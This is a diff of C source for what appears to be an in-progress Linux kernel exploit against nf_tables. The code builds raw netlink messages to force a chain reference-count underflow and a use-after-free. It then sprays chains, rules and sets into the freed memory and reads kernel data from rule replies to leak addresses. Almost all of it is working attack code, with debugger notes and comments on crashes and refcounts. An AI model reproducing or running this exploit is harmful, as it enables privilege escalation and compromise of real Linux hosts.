@@ -1595,6 +1595,174 @@ void newrule_immediate(int sock){
 }
 
 
+void newrule_immediate_refchain8(int sock, char *refchain8){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+    /*
+        NFT_REG_VERDICT == 0
+        pwndbg> p (unsigned int)NFT_GOTO
+        $5 = 4294967292
+    */
+    /*
+    {   
+        "NFTA_RULE_TABLE":"my_table",
+        "NFTA_RULE_CHAIN":"chain001",
+        "NFTA_RULE_EXPRESSIONS":{
+            "NFTA_LIST_ELEM":{
+                "NFTA_EXPR_NAME":"immediate",
+                "NFTA_EXPR_DATA":{
+                    "NFTA_IMMEDIATE_DREG":0,
+                    "NFTA_IMMEDIATE_DATA":{
+                        "NFTA_DATA_VERDICT":{
+                            "NFTA_VERDICT_CODE":4294967292,  
+                            "NFTA_VERDICT_CHAIN":"AAAAAAAA"
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    */
+
+    int pay1_size = 92;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,99,104,97,105,110,48,48,49,64,0,4,128,60,0,1,128,13,0,1,0,105,109,109,101,100,105,97,116,101,0,0,0,40,0,2,128,8,0,1,0,0,0,0,0,28,0,2,128,24,0,2,128,8,0,1,0,255,255,255,252,12,0,2,0,109,121,95,99,104,97,105,110};
+    memcpy(msgcon1+92-8, refchain8, 8);
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+    
+}
+
+void newrule_counter(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+    /*
+        NFT_REG_VERDICT == 0
+        pwndbg> p (unsigned int)NFT_GOTO
+        $5 = 4294967292
+    */
+    /*
+    {   
+        "NFTA_RULE_TABLE":"my_table",
+        "NFTA_RULE_CHAIN":"my_ccccc",
+        "NFTA_RULE_EXPRESSIONS":{
+            "NFTA_LIST_ELEM":{
+                "NFTA_EXPR_NAME":"counter"
+            }
+        }
+    }
+
+    */
+
+    int pay1_size = 48;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,99,99,99,99,99,20,0,4,128,16,0,1,128,11,0,1,0,99,111,117,110,116,101,114,0};
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+    
+}
+
 void getrule(int sock){
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
@@ -1602,6 +1770,12 @@ void getrule(int sock){
     struct nlmsghdr *nlh1;
     struct nlattr *attr;
     struct nfgenmsg *nfm;
+
+    // #define GETRULE_DEBUG
+
+    #ifdef GETRULE_DEBUG
+    write(1, "======== getrule ========\n", 0x20);
+    #endif
 
     /* Destination preparation */
     memset(&dest_snl, 0, sizeof(dest_snl));
@@ -1690,6 +1864,8 @@ void getrule(int sock){
      * usually get: reply (NFNL_SUBSYS_NFTABLES/NFT_MSG_NEWRULE) then ACK.
      * On failure you may only get the NLMSG_ERROR.
      */
+    const uint16_t expect_ack_type = nlh1->nlmsg_type;
+    const uint32_t expect_ack_seq  = nlh1->nlmsg_seq;
     int got_ack = 0;
     for (int i = 0; i < 8 && !got_ack; i++) {
         ret = recvmsg(sock, &rmsg, 0);
@@ -1700,18 +1876,19 @@ void getrule(int sock){
             break;
         }
 
-        printf("recv : %zd bytes\n", ret);
         char *r = &rmsg;
+        #ifdef GETRULE_DEBUG
+        printf("recv : %zd bytes\n", ret);
+        write(1, rbuf, ret);
         char *p = memmem(&rmsg, 0x200, "my_chain", 8);
-        printf("p : %p, r : %p, off=%d\n", p, r, p-r);
-        write(1, r+216, 0x8);
+        //printf("p : %p, r : %p, off=%d\n", p, r, p-r);
+        //write(1, r+216, 0x8);
+        #endif
+
         size_t val;
         memcpy(&val, r+216, 8);
         printf("val : %llx\n", val);
         
-
-        
-        //break;
 
         int rlen = (int)ret;
         for (struct nlmsghdr *rnlh = (struct nlmsghdr *)rbuf;
@@ -1719,11 +1896,37 @@ void getrule(int sock){
              rnlh = NLMSG_NEXT(rnlh, rlen)) {
             if (rnlh->nlmsg_type == NLMSG_ERROR) {
                 struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(rnlh);
-                printf("netlink ack: err=%d\n", err->error);
-                got_ack = 1;
+                #ifdef GETRULE_DEBUG
+                printf("netlink ack: err=%d (orig_type=0x%x subsys=%u cmd=%u seq=%u)\n",
+                       err->error,
+                       err->msg.nlmsg_type,
+                       (unsigned)(err->msg.nlmsg_type >> 8),
+                       (unsigned)(err->msg.nlmsg_type & 0xff),
+                       err->msg.nlmsg_seq);
+                #endif
+
+                /*
+                 * This netlink socket is shared across lots of sendmsg() calls
+                 * that never drain their replies. NLMSG_ERROR from earlier
+                 * requests can remain queued and show up here.
+                 *
+                 * Only treat the ACK/error that matches our GETRULE request as
+                 * "done".
+                 */
+                if (err->msg.nlmsg_type == expect_ack_type &&
+                    err->msg.nlmsg_seq  == expect_ack_seq) {
+                    got_ack = 1;
+                } else {
+                    #ifdef GETRULE_DEBUG
+                    printf("  (stale NLMSG_ERROR ignored; expect type=0x%x seq=%u)\n",
+                           expect_ack_type, expect_ack_seq);
+                    #endif
+                }
             } else {
+                #ifdef GETRULE_DEBUG
                 printf("netlink msg: type=0x%x len=%u\n",
                        rnlh->nlmsg_type, rnlh->nlmsg_len);
+                #endif
                 
             }
         }
@@ -1736,6 +1939,183 @@ void getrule(int sock){
     
 }
 
+
+
+void getrule_leak(int sock){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov;
+    struct nlmsghdr *nlh1;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    // #define GETRULE_DEBUG
+
+    #ifdef GETRULE_DEBUG
+    write(1, "======== getrule ========\n", 0x20);
+    #endif
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /*
+    {   
+        "NFTA_RULE_TABLE":"my_table",
+        "NFTA_RULE_CHAIN":"chain001",
+        "NFTA_RULE_HANDLE":4
+    }
+
+    */
+
+    /*
+     * NOTE:
+     * - NFT_MSG_GETRULE is registered as NFNL_CB_RCU (not NFNL_CB_BATCH),
+     *   so it must NOT be sent inside an NFNL_MSG_BATCH_{BEGIN,END} batch.
+     * - nfnetlink/netlink requires NLM_F_REQUEST, otherwise the kernel will
+     *   ignore the message.
+     * - NFTA_RULE_HANDLE is NLA_U64 (be64), so the attribute size must be 8.
+     */
+
+    int pay1_size = sizeof(struct nfgenmsg) + S8_NLA_SIZE + S8_NLA_SIZE + U64_NLA_SIZE;
+    int nlh1_size = NLMSG_SPACE(pay1_size);
+
+    nlh1 = (struct nlmsghdr *)malloc(nlh1_size);
+    if (!nlh1)
+        do_error_exit("malloc");
+
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETRULE;
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+    nlh1->nlmsg_seq = 0;
+
+    nfm = NLMSG_DATA(nlh1);
+    nfm->nfgen_family = NFPROTO_INET;
+
+    attr = (void *)nlh1 + NLMSG_SPACE(sizeof(struct nfgenmsg));
+    attr = set_str8_attr(attr, NFTA_RULE_TABLE, "my_table");
+    attr = set_str8_attr(attr, NFTA_RULE_CHAIN, "chain001");
+    attr = set_u64_attr(attr, NFTA_RULE_HANDLE, 4);
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    iov.iov_base = (void *)nlh1;
+    iov.iov_len = nlh1->nlmsg_len;
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+
+    sendmsg(sock, &msg, 0);
+    /*
+     * recvmsg() signature is:
+     *   ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
+     *
+     * Passing a raw buffer (like the global `data[]`) as the 2nd argument
+     * makes the kernel interpret it as a (zeroed) msghdr with iovlen == 0,
+     * which results in an immediate 0-byte receive.
+     */
+
+
+    char rbuf[NETLINK_RECEIVE_BUFFER_SIZE];
+    struct sockaddr_nl src_snl;
+    struct iovec riov;
+    struct msghdr rmsg;
+    ssize_t ret;
+
+    memset(&src_snl, 0, sizeof(src_snl));
+    memset(&rmsg, 0, sizeof(rmsg));
+    memset(rbuf, 0, sizeof(rbuf));
+
+    riov.iov_base = rbuf;
+    riov.iov_len = sizeof(rbuf);
+
+    rmsg.msg_name = (void *)&src_snl;
+    rmsg.msg_namelen = sizeof(src_snl);
+    rmsg.msg_iov = &riov;
+    rmsg.msg_iovlen = 1;
+
+    /*
+     * Read until we observe an ACK/error (NLMSG_ERROR). On success you
+     * usually get: reply (NFNL_SUBSYS_NFTABLES/NFT_MSG_NEWRULE) then ACK.
+     * On failure you may only get the NLMSG_ERROR.
+     */
+    const uint16_t expect_ack_type = nlh1->nlmsg_type;
+    const uint32_t expect_ack_seq  = nlh1->nlmsg_seq;
+    int got_ack = 0;
+    for (int i = 0; i < 8 && !got_ack; i++) {
+        ret = recvmsg(sock, &rmsg, 0);
+        if (ret < 0)
+            do_error_exit("recvmsg");
+        if (ret == 0) {
+            puts("recv : 0 bytes (peer closed?)");
+            break;
+        }
+
+        char *r = &rmsg;
+        #ifdef GETRULE_DEBUG
+        printf("recv : %zd bytes\n", ret);
+        write(1, rbuf, ret);
+        char *p = memmem(&rmsg, 0x200, "my_chain", 8);
+        //printf("p : %p, r : %p, off=%d\n", p, r, p-r);
+        //write(1, r+216, 0x8);
+        #endif
+
+        size_t val;
+        memcpy(&val, r+216, 8);
+        printf("val : %llx\n", val);
+        
+
+        int rlen = (int)ret;
+        for (struct nlmsghdr *rnlh = (struct nlmsghdr *)rbuf;
+             NLMSG_OK(rnlh, rlen);
+             rnlh = NLMSG_NEXT(rnlh, rlen)) {
+            if (rnlh->nlmsg_type == NLMSG_ERROR) {
+                struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(rnlh);
+                #ifdef GETRULE_DEBUG
+                printf("netlink ack: err=%d (orig_type=0x%x subsys=%u cmd=%u seq=%u)\n",
+                       err->error,
+                       err->msg.nlmsg_type,
+                       (unsigned)(err->msg.nlmsg_type >> 8),
+                       (unsigned)(err->msg.nlmsg_type & 0xff),
+                       err->msg.nlmsg_seq);
+                #endif
+
+                /*
+                 * This netlink socket is shared across lots of sendmsg() calls
+                 * that never drain their replies. NLMSG_ERROR from earlier
+                 * requests can remain queued and show up here.
+                 *
+                 * Only treat the ACK/error that matches our GETRULE request as
+                 * "done".
+                 */
+                if (err->msg.nlmsg_type == expect_ack_type &&
+                    err->msg.nlmsg_seq  == expect_ack_seq) {
+                    got_ack = 1;
+                } else {
+                    #ifdef GETRULE_DEBUG
+                    printf("  (stale NLMSG_ERROR ignored; expect type=0x%x seq=%u)\n",
+                           expect_ack_type, expect_ack_seq);
+                    #endif
+                }
+            } else {
+                #ifdef GETRULE_DEBUG
+                printf("netlink msg: type=0x%x len=%u\n",
+                       rnlh->nlmsg_type, rnlh->nlmsg_len);
+                #endif
+                
+            }
+        }
+
+        memset(rbuf, 0, sizeof(rbuf));
+    }
+
+    /* Free used structures */
+    free(nlh1);
+    
+}
 void spray_table(int sock, char *pay){
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
@@ -1779,6 +2159,164 @@ void spray_table(int sock, char *pay){
     uint8_t msgcon1[0x1000] = {1,0,0,0,20,0,1,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65};
     memcpy(msgcon1+8, pay, paylen);
     memset(msgcon1+4, paylen+4, 1);
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+    
+}
+
+void spray_chain(int sock, char *pay){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    int paylen = strlen(pay);
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+    /*
+    {   
+        "NFTA_CHAIN_TABLE":"my_table",
+        "NFTA_CHAIN_NAME":"AAAAAAAAAAAAAAAA"
+    }
+
+    */
+
+    int pay1_size = 20+paylen;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[0x1000] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,20,0,3,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65};
+    memcpy(msgcon1+20, pay, paylen);
+    memset(msgcon1+16, paylen+4, 1);
+    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
+
+    nlh_batch_end = get_batch_end_nlmsg();
+
+    /* IOV preparation */
+    memset(iov, 0, sizeof(iov));
+    int tot_iov = 0;
+    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
+    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
+    iov[tot_iov].iov_base = nlh1;
+    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
+    iov[tot_iov].iov_base = (void *)nlh_batch_end;
+    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;
+
+    /* Message header preparation */
+    msg.msg_name = (void *)&dest_snl;
+    msg.msg_namelen = sizeof(struct sockaddr_nl);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = tot_iov;
+
+    sendmsg(sock, &msg, 0);
+
+    /* Free used structures */
+    free(nlh_batch_end);
+    free(nlh1);
+    free(nlh_batch_begin);
+    
+}
+
+
+void new_last_expr(int sock, int setid){
+    struct msghdr msg;
+    struct sockaddr_nl dest_snl;
+    struct iovec iov[0x100];
+    struct nlmsghdr *nlh_batch_begin;
+    struct nlmsghdr *nlh_batch_end;
+    struct nlattr *attr;
+    struct nfgenmsg *nfm;
+
+    /* Destination preparation */
+    memset(&dest_snl, 0, sizeof(dest_snl));
+    dest_snl.nl_family = AF_NETLINK;
+    memset(&msg, 0, sizeof(msg));
+
+    /* Netlink batch_begin message preparation */
+    nlh_batch_begin = get_batch_begin_nlmsg();
+
+    /*
+        NFT_REG_VERDICT == 0
+        pwndbg> p (unsigned int)NFT_GOTO
+        $5 = 4294967292
+    */
+    /*
+    {   
+        "NFTA_SET_TABLE":"my_table",
+        "NFTA_SET_NAME":"AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB",
+        "NFTA_SET_FLAGS":0,
+        "NFTA_SET_KEY_LEN":64,
+        "NFTA_SET_KEY_TYPE":13,
+        "NFTA_SET_ID":20,
+        "NFTA_SET_EXPR":{
+            "NFTA_EXPR_NAME":"last"
+        }
+    }
+
+    */
+
+    int pay1_size = 128;  //消息体的大小；
+    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小
+
+    /* Netlink table message preparation */
+    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
+    
+    memset(nlh1, 0, nlh1_size);
+    nlh1->nlmsg_len = nlh1_size;
+    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;  //注意修改
+    nlh1->nlmsg_pid = mypid;
+    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
+    nlh1->nlmsg_seq = 0;
+
+
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,68,0,2,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,8,0,3,0,0,0,0,0,8,0,5,0,0,0,0,64,8,0,4,0,0,0,0,13,8,0,10,0,0,0,0,20,12,0,17,128,8,0,1,0,108,97,115,116};
+    memset(msgcon1+128-13, setid, 1);
+    memset(msgcon1+20, setid, 1);
+    
     memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
 
     nlh_batch_end = get_batch_end_nlmsg();
@@ -1952,36 +2490,21 @@ int main(){
     }
     printf("[+] Netlink socket created\n");
 
-// =================================== prepare msg_msg ======================
-
-    char msg_buf[0x4000];
-    #define TOTMSG 0X100
-    int msqids[TOTMSG];
-    for(int i = 0; i < TOTMSG; i++){
-        msqids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-    }
-
 // ==================================== trigger =============================
     
 
+    /*
+    // crashs
     create_table(sock, "my_table");
     create_pipapo_set_MAP(sock);
-    //create_binding_chain(sock);
     create_chain(sock, "my_table", "chain001");
     create_chain(sock, "my_table", "my_chain");
     newrule_immediate(sock);
-    getrule(sock);
-
     add_set_elem_bind_chain(sock);
-    
     pwn(sock);  // abort 不会进行代际切换               ## chain->use --
     create_chain(sock, "my_table", "my_ccccc");
-    //delchain(sock, "my_chain"); // use == 0 ，可以成功free掉chain   
-
-    
     delset(sock); // use == 0, 会导致引用计数检查失败    ## chain->use --
     delchain(sock, "my_chain");
-    
     char tname[0x100];
     memset(tname, 0, sizeof(tname));
     for(int i = 0; i < 0x100; i++){
@@ -1990,15 +2513,34 @@ int main(){
     }
 
     getrule(sock);
-    delchain(sock, "chain001");
+    delchain(sock, "chain001");*/
     
+
+    create_table(sock, "my_table");
+    create_pipapo_set_MAP(sock);
+    create_chain(sock, "my_table", "chain001");
+    create_chain(sock, "my_table", "my_chain");
+    newrule_immediate(sock);
+    getrule(sock);
+    add_set_elem_bind_chain(sock);
+    pwn(sock);  // abort 不会进行代际切换               ## chain->use --
+    create_chain(sock, "my_table", "my_ccccc");
+    delset(sock); // use == 0, 会导致引用计数检查失败    ## chain->use --
+    delchain(sock, "my_chain");
+    char tname[0x100];
+    memset(tname, 0, sizeof(tname));
+    for(int i = 0; i < 0x200; i++){
+        memset(tname, i, 0x8);
+        //spray_chain(sock, tname);
+        //newrule_immediate_refchain8(sock, tname);
+        new_last_expr(sock, i+20);
+
+    }
+    getrule(sock);
+
     
-        
 
     return ;
-
-
-
     
     
 }
